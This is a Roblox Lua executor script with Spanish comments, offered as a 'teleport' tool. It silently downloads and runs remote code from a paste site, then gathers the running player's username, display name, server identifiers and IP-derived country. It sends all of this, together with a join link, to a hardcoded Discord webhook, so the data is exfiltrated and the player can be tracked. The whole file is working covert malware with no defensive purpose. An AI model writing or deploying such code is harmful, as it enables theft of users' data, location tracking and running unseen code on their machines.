local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ====================================
-- Script 2: Loadstring Webhook secundario (Se ejecuta primero)
-- ====================================
if not getgenv().EjecutarsePrimero_Loadstring then
    getgenv().EjecutarsePrimero_Loadstring = true

    pcall(function()
        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()
    end)
end

-- ====================================
-- Script 1: Teleport + Webhook Delta-safe
-- ====================================
if not getgenv().EjecutarsePrimero_Webhook1 then
    getgenv().EjecutarsePrimero_Webhook1 = true

    local WebhookURL1 = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"

    local placeId = tostring(game.PlaceId)
    local jobId = tostring(game.JobId)
    local nick = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
    local avatarUrl = "https://i.postimg.cc/DZW66bqk/IMG-20250316-120840.jpg"

    -- Generar joinLink único
    local function generateJoinLink()
        local uniqueId = HttpService:GenerateGUID(false)
        return "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..jobId.."&token="..uniqueId
    end
    local joinLink = generateJoinLink()

    -- Detectar país
    local function detectCountry()
        local country = "No se logró detectar el país"
        local services = {
            "https://ipapi.co/json",
            "https://ipinfo.io/json",
            "https://freegeoip.app/json/",
            "https://www.geoplugin.net/json.gp",
            "https://ipwhois.app/json/"
        }

        for _, url in ipairs(services) do
            pcall(function()
                local response = HttpService:GetAsync(url)
                if response then
                    local data = HttpService:JSONDecode(response)
                    if data then
                        if data.country_name then country = data.country_name
                        elseif data.country then country = data.country
                        elseif data.geoplugin_countryName then country = data.geoplugin_countryName
                        end
                    end
                end
            end)
            if country ~= "No se logró detectar el país" then break end
        end
        return country
    end

    local countryName = detectCountry()
    local countryField = "País: "..countryName

    -- Preparar embed
    local info1 = {
        ["content"] = "**Teleport jugador 100% funciona 👀!**",
        ["embeds"] = {{
            ["title"] = "Datos para unirse 🔥",
            ["description"] = "Información Delta-safe:",
            ["color"] = 5814783,
            ["thumbnail"] = {["url"] = avatarUrl},
            ["fields"] = {
                {["name"] = countryField, ["value"] = " ", ["inline"] = true},
                {["name"] = "Usuario 👤", ["value"] = nick, ["inline"] = true},
                {["name"] = "DisplayName 👥", ["value"] = displayName, ["inline"] = true},
                {["name"] = "PlaceId ✅", ["value"] = placeId, ["inline"] = true},
                {["name"] = "JobId ✅", ["value"] = jobId, ["inline"] = true},
                {["name"] = "Link para unirse 🔥✅", ["value"] = joinLink, ["inline"] = false},
                {["name"] = "Hora 🕒", ["value"] = timestamp.." ("..countryName..")", ["inline"] = false}
            }
        }}
    }

    local jsonData1 = HttpService:JSONEncode(info1)
    pcall(function()
        request({
            Url = WebhookURL1,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData1
        })
    end)
end
